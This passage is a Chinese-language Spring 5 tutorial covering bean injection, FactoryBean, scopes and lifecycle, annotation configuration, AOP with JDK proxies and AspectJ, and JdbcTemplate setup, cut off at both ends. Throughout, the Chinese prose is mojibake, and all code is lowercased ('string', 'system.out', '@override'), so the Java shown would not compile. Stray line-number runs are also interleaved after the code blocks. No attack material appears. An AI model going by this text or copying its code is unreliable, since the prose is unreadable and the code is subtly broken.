userservice.class);\n\tuserservice.adduser();\n}\n\n\n1\n2\n3\n4\n5\n\n\n# åé¨bean\n\nå¦æéè¦å¨å®ä½ç±»ä¸­è¡¨ç¤ºç±»åç±»ä¹é´çå¯¹åºå³ç³»ï¼å¯ä»¥ä½¿ç¨åé¨beanæ¹å¼è¿è¡è¡¨ç¤ºã\n\n 1. ç¼åæµè¯deptç±»\n\npackage com.pwddd.spring5;\n\npublic class dept {\n    private string dname;\n    public void setdname(string dname) {\n        this.dname = dname;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. ç¼åæµè¯empç±»\n\npackage com.pwddd.spring5;\n\npublic class emp {\n    private string ename;\n    private string gender;\n    //åå·¥å±äºæä¸ä¸ªé¨é¨ï¼ä½¿ç¨å¯¹è±¡å½¢å¼è¡¨ç¤º\n    private dept dept;\n    public void setdept(dept dept) {\n        this.dept = dept;\n    }\n    public void setename(string ename) {\n        this.ename = ename;\n    }\n    public void setgender(string gender) {\n        this.gender = gender;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n 3. ç¬¬ä¸ç§æ¹å¼éç½®æä»¶\n\n<bean id="emp" class="com.pwddd.spring5.emp">\n  <property name="ename"  value="lalal"></property>\n  <property name="gender" value="male"></property>\n  <property name="dept">\n      <bean id="dept" class="com.pwddd.spring5.dept">\n          <property name="dname" value="å®ä¿"></property> \n      </bean>\n  </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. ç¬¬äºç§æ¹å¼éè¦å¨empä¸­çædeptçgetæ¹æ³\n\npublic dept getdept() { return dept; }\n\n\n1\n\n 5. ç¬¬äºç§æ¹å¼éç½®æä»¶\n\n<bean id="emp" class="com.pwddd.spring5.emp">\n    <property name="gender" value="male"></property>\n    <property name="ename"  value="lalal"></property>\n    <property name="dept" ref="dept"></property>\n    <property name="dept.dname" value="ä¿å®"></property>\n</bean>\n<bean id="dept" class="com.pwddd.spring5.dept">\n    <property name="dname"  value="è´¢å¡"></property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# éåç±»å\n\néåç±»åæ¯æarrayãlistãmapãsetç­ç±»åã\n\n 1. ç¼åæµè¯ç±»ï¼ç±»ä¸­åå«éåç±»åçä¾èµå³ç³»\n\npackage com.pwddd.spring5;\n\nimport java.util.arrays;\nimport java.util.list;\nimport java.util.map;\nimport java.util.set;\n\npublic class stu {\n    public string[] courses;\n\n    public list<string> lists;\n\n    public map<string, string> maps;\n\n    public set<string> sets;\n\n    public void setcourses(string[] courses) {\n        this.courses = courses;\n    }\n\n    public void setlists(list<string> lists) {\n        this.lists = lists;\n    }\n\n    public void setmaps(map<string, string> maps) {\n        this.maps = maps;\n    }\n\n    public void setsets(set<string> sets) {\n        this.sets = sets;\n    }\n\n    @override\n    public string tostring() {\n        return "stu{" +\n                "courses=" + arrays.tostring(courses) +\n                ", lists=" + lists +\n                ", maps=" + maps +\n                ", sets=" + sets +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n 2. ç¼åxmléç½®æä»¶éç½®æ³¨å¥ã\n\n<bean id="stu" class="com.pwddd.spring5.stu">\n    <property name="courses">\n        <array>\n            <value>è¯­æ</value>\n            <value>æ°å­¦</value>\n        </array>\n    </property>\n\n    <property name="lists">\n        <list>\n            <value>å¼ ä¸</value>\n            <value>æå</value>\n        </list>\n    </property>\n\n    <property name="maps">\n        <map>\n            <entry key="java" value="1"></entry>\n            <entry key="c" value="2"></entry>\n        </map>\n    </property>\n\n    <property name="sets">\n        <set>\n            <value>aaa</value>\n            <value>bbb</value>\n        </set>\n    </property>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n# éååå®¹æå\n\nå¦æå¤ä¸ªä¾èµæ³¨å¥éè¦å¼ç¨ç¸åçéåå¼ï¼é£ä¹å¯ä»¥å°éåå¼æååºæ¥ï¼ç¨çæ¶åç´æ¥å¼ç¨å³å¯ãæåéè¦å¼å¥utilã\n\nå®ä¾xmléç½®ï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xsi:schemalocation="\n       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n<util:list id="booklist">\n        <value>haha</value>\n        <value>lala</value>\n    </util:list>\n\n    <bean id="book" class="com.pwddd.spring5.book">\n        <property name="booklist" ref="booklist"></property>\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# å·¥åbean\n\nspringæä¸¤ç§ç±»åbeanï¼ä¸ç§æ®ébeanï¼å¦å¤ä¸ç§å·¥åbeanï¼factorybeanï¼ä¸åäºbeanfactoryï¼\n\n * æ®ébeanï¼å¨éç½®æä»¶ä¸­å®ä¹beanç±»åå°±æ¯è¿åç±»å\n * å·¥åbeanï¼å¨éç½®æä»¶å®ä¹beanç±»åå¯ä»¥åè¿åç±»åä¸ä¸æ ·\n\nå·¥åbeançä½¿ç¨æ¹å¼ï¼\n\n 1. åå»ºç±»ï¼ä½¿è¿ä¸ªç±»æä¸ºå·¥åï¼å¹¶å®ç°factorybeanæ¥å£\n\npackage com.pwddd.spring5;\n\nimport com.pwddd.spring5.course;\nimport org.springframework.beans.factory.factorybean;\n\npublic class myfactorybean implements factorybean<course> {\n  @override\n  public course getobject() throws exception {\n\t  course course = new course();\n\t  course.setcname("aaa");\n\t  return course;\n  }\n\n  @override\n  public class<?> getobjecttype() {\n\t  return course.class;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. å®ç°æ¥å£éé¢çæ¹æ³ï¼å¨å®ç°çæ¹æ³ä¸­å®ä¹è¿åçbeanç±»å\n\n<bean id="factorybean" class="com.pwddd.spring5.myfactorybean"></bean>\n\n\n1\n\n\n# beançä½ç¨å\n\nå¨springéé¢ï¼é»è®¤æåµä¸ï¼beanæ¯åå®ä¾å¯¹è±¡ã\n\n\n\nå¯ä»¥éè¿éç½®æä»¶è®¾ç½®beanæ¯åä¾çè¿æ¯å¤ä¾çæ¨¡å¼ï¼ å¨springéç½®æä»¶beanæ ç­¾éé¢æå±æ§ï¼scopeï¼ç¨äºè®¾ç½®åå®ä¾è¿æ¯å¤å®ä¾ ç¬¬ä¸ä¸ªå¼ é»è®¤å¼ï¼singletonï¼è¡¨ç¤ºæ¯åå®ä¾å¯¹è±¡ ç¬¬äºä¸ªå¼prototypeï¼è¡¨ç¤ºæ¯å¤å®ä¾å¯¹è±¡\n\n<bean id="course" class="com.pwddd.spring5.course" scope="prototype"></bean>\n\n\n1\n\n\nsingletonåprototypeåºå«\n\n * singletonåå®ä¾ï¼prototypeå¤å®ä¾\n * è®¾ç½®scopeå¼æ¯singletonæ¶åï¼å è½½springéç½®æä»¶æ¶åå°±ä¼åå»ºåå®ä¾å¯¹è±¡\n * è®¾ç½®scopeå¼æ¯prototypeæ¶åï¼ä¸æ¯å¨å è½½springéç½®æä»¶æ¶ååå»ºå¯¹è±¡ï¼å¨è°ç¨getbeanæ¹æ³æ¶ååå»ºå¤å®ä¾å¯¹è±¡\n\n# beançå½å¨æååç½®å¤çå¨\n\n# beançå½å¨æ\n\n * éè¿æé å¨åå»ºbeanå®ä¾ï¼æ åæ°æé ï¼\n * ä¸ºbeançå±æ§è®¾ç½®å¼åå¯¹å¶ä»beanå¼ç¨ï¼è°ç¨setæ¹æ³ï¼\n * æbeanå®ä¾ä¼ ébeanåç½®å¤çå¨çæ¹æ³postprocessbeforeinitialization\n * è°ç¨beançåå§åçæ¹æ³ï¼éè¦è¿è¡éç½®åå§åçæ¹æ³ï¼\n * æbeanå®ä¾ä¼ ébeanåç½®å¤çå¨çæ¹æ³ postprocessafterinitialization\n * beanå¯ä»¥ä½¿ç¨äºï¼å¯¹è±¡è·åå°äºï¼\n * å½å®¹å¨å³é­æ¶åï¼è°ç¨beançéæ¯çæ¹æ³ï¼éè¦è¿è¡éç½®éæ¯çæ¹æ³ï¼\n\n# åç½®å¤çå¨\n\nåå»ºåç½®å¤çå¨éè¦å®ç°beanpostprocessoræ¥å£ï¼å¹¶éå%before%å%after%ä¸¤ä¸ªæ¹æ³ã\n\n# å±æ§èªå¨è£é\n\næ ¹æ®æå®è£éè§åï¼å±æ§åç§°æèå±æ§ç±»åï¼ï¼springèªå¨å°å¹éçå±æ§å¼è¿è¡æ³¨å¥ã\n\næ ¹æ®åç§°èªå¨è£é\n<bean id="emp" class="com.pwddd.spring5.emp" autowire="byname"></bean>\n    <bean id="dept" class="com.pwddd.spring5.dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.dept"></bean>\n\næ ¹æ®ç±»åèªå¨è£é  æ¥é å­å¨ä¸¤ä¸ªç¸åçç±»å\n<bean id="emp" class="com.pwddd.spring5.emp" autowire="bytype"></bean>\n    <bean id="dept" class="com.pwddd.spring5.dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.dept"></bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# å¼å¥å¤é¨éç½®æä»¶\n\néç½®æ°æ®æºçæ¹å¼1ï¼\n\n<bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n    <property name="url" value="jdbc:mysql://localhost:3306/aaaa" />\n    <property name="username" value="root" />\n    <property name="password" value="root" />\n    <property name="driverclassname" value="com.mysql.jdbc.driver" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n\n\néç½®æ°æ®æºçæ¹å¼2ï¼\n\n 1. åå»ºjdbc.propertieså¤é¨éç½®æä»¶\n\njdbc.url=jdbc:mysql://localhost:3306/aaa\njdbc.username=root\njdbc.password=root\njdbc.driver=com.jdbc.mysql.driver\n\n\n1\n2\n3\n4\n\n 2. å¼å¥å°xmlä¸­ï¼å¹¶è¿è¡å¼ç¨ã\n\n<context:property-placeholder location="classpath:jdbc.properties"></context:property-placeholder>\n<bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n    <property name="driverclassname" value="${jdbc.driver}"/>\n    <property name="username" value="${jdbc.username}" />\n    <property name="url" value="${jdbc.url}" />\n    <property name="password" value="${jdbc.password}" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# åºäºæ³¨è§£è¿è¡éç½®\n\næ³¨è§£æ¯ä»£ç ç¹æ®æ è®°ï¼æ ¼å¼ï¼@æ³¨è§£åç§°(å±æ§åç§°=å±æ§å¼, å±æ§åç§°=å±æ§å¼..)ãæ³¨è§£å¯ä»¥æ¾å¨ç±»ä¸é¢ãæ¹æ³ä¸é¢ãå±æ§ä¸é¢ãä½¿ç¨æ³¨è§£è¿è¡éç½®å¯ä»¥ç®åxmlæä»¶ã\n\n# åå»ºå¯¹è±¡\n\nspringéå¯¹beanç®¡çä¸­åå»ºå¯¹è±¡æä¾æ³¨è§£\n\n * @component -- æ®ébean\n * @service -- serviceå±\n * @controller -- controllerå±\n * @repository --daoå±\n\nä½¿ç¨æ¹å¼ï¼\n\n 1. å¼å¯ç»ä»¶æ«æ\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\nhttp://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd">\n  <context:component-scan base-package="com.pwddd.spring5.anno"></context:component-scan>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. å°æ³¨è§£å å°ç±»ä¸\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.stereotype.service;\n\n@service(value = "userservice")\npublic class userservice {\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. éç½®ç»ä»¶æ«æè¿æ»¤ ç»ä»¶æ«æå¯ä»¥éç½®æ«ææäºç»ä»¶ãä¸æ«ææäºç»ä»¶ã\n\n<context:component-scan base-package="com.pwddd.spring5.anno" use-default-filters="false">\n    <context:include-filter type="annotation" expression="org.springframework.stereotype.service"/>\n    <context:exclude-filter type="annotation" expression="org.springframework.stereotype.controller"/>\n</context:component-scan>\n\n\n1\n2\n3\n4\n\n\n# æ³¨å¥å±æ§\n\næ³¨å¥å±æ§æä¸é¢å ç§æ³¨è§£çæ¹å¼ï¼\n\n * @autowiredï¼æ ¹æ®å±æ§ç±»åè¿è¡èªå¨è£é\n * @qualifierï¼æ ¹æ®åç§°è¿è¡æ³¨å¥ è¿ä¸ª@qualifieræ³¨è§£çä½¿ç¨ï¼åä¸é¢@autowiredä¸èµ·ä½¿ç¨\n * @resourceï¼å¯ä»¥æ ¹æ®ç±»åæ³¨å¥ï¼å¯ä»¥æ ¹æ®åç§°æ³¨å¥\n * @valueï¼æ³¨å¥æ®éç±»åå±æ§\n\næµè¯ç±»ï¼\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.beans.factory.annotation.qualifier;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.stereotype.service;\n\nimport javax.annotation.resource;\n\n@service(value = "userservice")\npublic class userservice {\n//    @autowired\n//    @qualifier(value = "dao")\n  @resource\n  public userdao userdao;\n\n  @value("halo")\n  public string name;\n\n  public void test(){\n      system.out.println(name);\n      userdao.add();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# å®å¨æ³¨è§£å¼å\n\nä½¿ç¨ä¸ä¸ªç±»æ¥æ¿æ¢xmlæä»¶ï¼è¿è¡éç½®ã\n\n@configuration  // å£°æè¿æ¯ä¸ä¸ªéç½®ç±»\n@componentscan(basepackages = {"com.pwddd.spring5.anno"})  //éç½®åæ«æ\npublic class springconfig {\n}\n\n\n1\n2\n3\n4\n\n\næµè¯ä»£ç annotationconfigapplicationcontextä½¿ç¨ç±»çæcontextå¯¹è±¡\n\n@test\npublic void test(){\n    applicationcontext context = new annotationconfigapplicationcontext(springconfig.class);\n    userservice userservice = context.getbean("userservice", userservice.class);\n    userservice.test();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# æ³¨è§£æ¹å¼çéç½®æä»¶æ³¨å¥\n\npackage com.pwddd.spring5.dao.impl;  \n  \nimport com.pwddd.spring5.dao.userdao;  \nimport com.pwddd.spring5.entity.user;  \nimport org.springframework.beans.factory.annotation.autowired;  \nimport org.springframework.beans.factory.annotation.value;  \nimport org.springframework.context.annotation.propertysource;  \nimport org.springframework.stereotype.repository;  \n  \n@repository  \n@propertysource("classpath:test.properties")  \npublic class userdaoimpl implements userdao {  \n  \n @value("${properties.result}")  \n private string result;  \n  \n @override  \n public user getuserbyusername(string username) {  \n system.out.println(result);  \n return new user("zhangsan","male",12);  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# springaop\n\n\n# aopæ¦å¿µ\n\né¢ååé¢ç¼ç¨ï¼æ¹é¢ï¼ï¼å©ç¨ aop å¯ä»¥å¯¹ä¸å¡é»è¾çåä¸ªé¨åè¿è¡éç¦»ï¼ä»èä½¿å¾ ä¸å¡é»è¾åé¨åä¹é´çè¦ååº¦éä½ï¼æé«ç¨åºçå¯éç¨æ§ï¼åæ¶æé«äºå¼åçæçã éä¿æè¿°ï¼ä¸éè¿ä¿®æ¹æºä»£ç æ¹å¼ï¼å¨ä¸»å¹²åè½éé¢æ·»å æ°åè½ã\n\n\n\n\n# aopåºå±åç\n\naopåºå±ä½¿ç¨å¨æä»£çå®ç°ï¼å¨æä»£çæä¸¤ç§ï¼ä¸ç§æ¯ææ¥å£çæåµï¼ä½¿ç¨jdkçå¨æä»£çã\n\n\n\nç¬¬äºç§æ¯æ²¡ææ¥å£çæåµï¼ä½¿ç¨cglibå¨æä»£ç\n\n\n\njdkå¨æä»£çå®ç°çæ¹å¼\n\n\n\n 1. åå»ºæ¥å£ï¼å®ä¹ç¸å³çæ¹æ³\n\npackage com.pwddd.spring5aop.test;\n\npublic interface userdao {\n    int add(int a, int b);\n    string update(string id);\n}\n\npackage com.pwddd.spring5aop.test;\n\npublic class userdaoimpl implements userdao{\n    @override\n    public int add(int a, int b) {\n        system.out.println("add... æ¹æ³æ§è¡äºï¼");\n        return a+b;\n    }\n\n    @override\n    public string update(string id) {\n        return id;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. åå»ºä»£çç±»\n\npackage com.pwddd.spring5aop.test;\n\nimport java.lang.reflect.invocationhandler;\nimport java.lang.reflect.method;\nimport java.lang.reflect.proxy;\nimport java.util.arrays;\n\npublic class jdkproxy {\n    public static void main(string[] args) {\n        class[] interfaces = {userdao.class};\n        userdaoimpl userdao = new userdaoimpl();\n        userdao dao = (userdao) proxy.newproxyinstance(jdkproxy.class.getclassloader(), interfaces, new userdaoproxy(userdao));\n        system.out.println("result:"+dao.add(1, 2));\n    }\n}\n\nclass userdaoproxy implements invocationhandler{\n    private object obj;\n\n    public userdaoproxy(object obj) {\n        this.obj = obj;\n    }\n\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n\n        // æ¹æ³æ§è¡ä¹å\n        system.out.println("æ¹æ³æ§è¡ä¹å:"+method.getname()+ arrays.tostring(args));\n        object result = method.invoke(obj, args);\n        system.out.println("æ¹æ³æ§è¡ä¹å:"+obj);\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# aopç¸å³æ¦å¿µ\n\nè¿æ¥ç¹ - ç±»éçé£äºæ¹æ³å¯ä»¥è¢«å¢å¼ºï¼è¿äºå¯ä»¥è¢«å¢å¼ºçæ¹æ³ç§°ä¸ºè¿æ¥ç¹ åå¥ç¹ - å®éè¢«çæ­£å¢å¼ºçæ¹æ³ç§°ä¸ºåå¥ç¹ éç¥ï¼å¢å¼ºï¼ - ç¨äºå¢å¼ºçé»è¾é¨å - åä¸ºï¼åç½®ãåç½®ãç¯ç»ãå¼å¸¸ãè¿åï¼æç»ï¼éç¥ç±»å åé¢ - å®éä¸æå¢å¼ºåºç¨å°åå¥ç¹çè¿ç¨ï¼è¿ä¸ªå¨ä½ã\n\n\n# aopç¯å¢åå¤\n\nspring æ¡æ¶ä¸è¬é½æ¯åºäº aspectj å®ç° aop æä½ãaspectj ä¸æ¯ spring ç»æé¨åï¼æ¯ä¸ä¸ªç¬ç« çaop æ¡æ¶ï¼ä¸è¬æ aspectj å spirng æ¡æ¶ä¸èµ·ä½¿ç¨ï¼è¿è¡ aop æä½ã åºäºaspectjæä¸¤ç§å®ç°aopçæä½æ¹å¼ï¼\n\n * åºäºxmlæä»¶çæ¹å¼\n * åºäºæ³¨è§£çæ¹å¼\n\nä¾èµçjaråï¼\n\n\n\nåå¥ç¹è¡¨è¾¾å¼\nåå¥ç¹è¡¨è¾¾å¼ä½ç¨ï¼ç¥éå¯¹åªä¸ªç±»éé¢çåªä¸ªæ¹æ³è¿è¡å¢å¼º\nè¯­æ³ç»æï¼ execution([æéä¿®é¥°ç¬¦] [è¿åå¼ç±»å] [ç±»å¨è·¯å¾\\].æ¹æ³å(\\[å½¢ååè¡¨\\])\nä¸¾ä¾ 1ï¼å¯¹ com.atguigu.dao.bookdao ç±»éé¢ç add è¿è¡å¢å¼º \n\texecution(* com.atguigu.dao.bookdao.add(..)) \nä¸¾ä¾ 2ï¼å¯¹ com.atguigu.dao.bookdao ç±»éé¢çææçæ¹æ³è¿è¡å¢å¼º \n\texecution(* com.atguigu.dao.bookdao.* (..)\nä¸¾ä¾ 3ï¼å¯¹ com.atguigu.dao åéé¢ææç±»ï¼ç±»éé¢æææ¹æ³è¿è¡å¢å¼º \n\texecution(* com.atguigu.dao.*.** (..))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# åºäºæ³¨è§£æ¹å¼çéç½®\n\n 1. åå»ºå¢å¼ºç±»åè¢«å¢å¼ºçæ¹æ³\n\npublic class user {\n    public void add(){\n        /**\n         * è¢«å¢å¼ºæ¹æ³\n         */\n        system.out.println("add........");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. åå»ºå¢å¼ºç±»åç¸å³å¢å¼ºæ¹æ³\n\npublic class userproxy {\n    /**\n     * å¢å¼ºæ¹æ³\n     */\n    public void before(){\n        system.out.println("before ..... userproxy");\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 3. è¿è¡éç½®ï¼å¼å¯æ³¨è§£æ«æï¼çæä»£çå¯¹è±¡\n\n\x3c!--    å¼å¯æ³¨è§£æ«æ--\x3e\n <context:component-scan base-package="com.pwddd.spring5aop.aopanno" />\n\x3c!--    å¼å¯çæä»£çå¯¹è±¡--\x3e\n <aop:aspectj-autoproxy />\n\n\n1\n2\n3\n4\n\n 4. éç½®éç¥ç±»å\n\n@before(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void before(){\n    system.out.println("before ..... userproxy");\n}\n\n@after(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void after(){\n    system.out.println("after ..... userproxy");\n}\n@afterthrowing(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void afterthrowing(){\n    system.out.println("afterthrowing ..... userproxy");\n}\n\n@afterreturning(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void afterreturning(){\n    system.out.println("afterreturning ..... userproxy");\n}\n\n@around(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void around(proceedingjoinpoint proceedingjoinpoint) throws throwable {\n\n    system.out.println("around ..... qian");\n    proceedingjoinpoint.proceed();\n    system.out.println("around ------ hou");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 5. ç¸ååå¥ç¹è¡¨è¾¾å¼å¯æ½ååºæ¥\n\n/**\n * æ½åç¸åçåå¥ç¹è¡¨è¾¾å¼\n */\n@pointcut(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\npublic void mypoint(){\n\n}\n\n/**\n * å¢å¼ºæ¹æ³\n */\n@before(value = "mypoint()")\npublic void before(){\n    system.out.println("before ..... userproxy");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n 6. å¤ä¸ªå¢å¼ºçæ¹æ³ä½ç¨äºåä¸ä¸ªæ¹æ³ï¼å¯ä»¥è®¾ç½®ä¼åçº§\n\n@component\n@aspect\n@order(1)\npublic class personproxy {\n    @before(value = "execution(* com.pwddd.spring5aop.aopanno.user.add(..))")\n    public void before(){\n        system.out.println("person ......");\n    }\n}\n\nä»å°å°å¤§ä¼åçº§éä½\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 7. éç½®å®å¨æ³¨è§£å¼å\n\npackage com.pwddd.spring5aop.aopanno;\n\nimport org.springframework.context.annotation.componentscan;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.context.annotation.enableaspectjautoproxy;\n\n@configuration\n@componentscan(basepackages = {"com.pwddd.spring5aop.aopanno"})  // å¼å¯æ³¨è§£æ«æ\n@enableaspectjautoproxy(proxytargetclass = true)  // å¼å¯éç½®aopå¯¹è±¡\npublic class springconfig {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> tips: å½ç¨åºè¿è¡æåºå¼å¸¸æ¶ï¼afterthrowingãafterå­å¨ï¼afterreturningä¸å­å¨ã\n\n\n# åºäºxmlæ¹å¼éç½®\n\n 1. åå»ºå¢å¼ºç±»ãå¢å¼ºæ¹æ³ãè¢«å¢å¼ºç±»ãè¢«å¢å¼ºæ¹æ³\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * å¢å¼ºç±»\n */\npublic class bookproxy {\n    /**\n     * å¢å¼ºæ¹æ³\n     */\n    public void before(){\n        system.out.println("before.....");\n    }\n}\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * è¢«å¢å¼ºç±»\n */\npublic class book {\n    /**\n     * è¢«å¢å¼ºæ¹æ³\n     */\n    public void buy(){\n        system.out.println("buy .....");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. ç¼åspringéç½®æä»¶\n\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xmlns:aop="http://www.springframework.org/schema/aop"\n     xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                      http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                      http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n\n  <bean id="book" class="com.pwddd.spring5aop.aopxml.book" />\n  <bean id="bookproxy" class="com.pwddd.spring5aop.aopxml.bookproxy" />\n\n\x3c!--    // éç½®åå¥ç¹--\x3e\n  <aop:config>\n      <aop:pointcut id="buy" expression="execution(* com.pwddd.spring5aop.aopxml.book.buy(..))"/>\n      <aop:aspect ref="bookproxy">\n          <aop:before method="before" pointcut-ref="buy" />\n      </aop:aspect>\n  </aop:config>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# jdbctemplate\n\n\n# æ¦è¿°\n\nspring æ¡æ¶å¯¹ jdbc è¿è¡å°è£ï¼ä½¿ç¨ jdbctemplate æ¹ä¾¿å®ç°å¯¹æ°æ®åºæä½ã\n\n\n# åå¤å·¥ä½\n\n 1. å¯¼å¥ç¸å³jarå\n\n\n\n 2. éç½®springéç½®æä»¶ï¼å¼å¯æ³¨è§£æ«æãéç½®æ°æ®æºãéç½®jdbctemplateå¯¹è±¡ã\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n\x3c!--    å¼å¯æ³¨è§£æ«æ--\x3e\n    <context:component-scan base-package="com.pwddd.spring5.jdbc" />\n\x3c!--    å¯¼å¥éç½®æä»¶--\x3e\n    <context:property-placeholder location="classpath:jdbc.properties" />\n\x3c!--    éç½®æ°æ®æº--\x3e\n    <bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n        <property name="url" value="${jdbc.url}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="driverclassname" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n\x3c!--    éç½®jdbctemplate--\x3e\n    <bean id="jdbctemplate" class="org.springframework.jdbc.core.jdbctemplate">\n        <property name="datasource" ref="datasource" />\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 3. ç¼åç¸å³ä¸å¡æ¹æ³\n\nservice\n\npackage com.pwddd.spring5.jdbc.service.impl;\n\nimport com.pwddd.spring5.jdbc.dao.bookdao;\nimport com.pwddd.spring5.jdbc.service.bookservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.component;\n\n@component\npublic class bookserviceimpl implements bookservice {\n\t@autowired\n\tprivate bookdao bookdao;\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ndao\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.bookdao;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.stereotype.component;\n\n@component\npublic class bookdaoimpl implements bookdao {\n\t@autowired\n\tprivate jdbctemplate jdbctemplate;\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 4. ç¼åæµè¯æ¹æ³\n\npackage com.pwddd.spring5.jdbc.test;\n\nimport 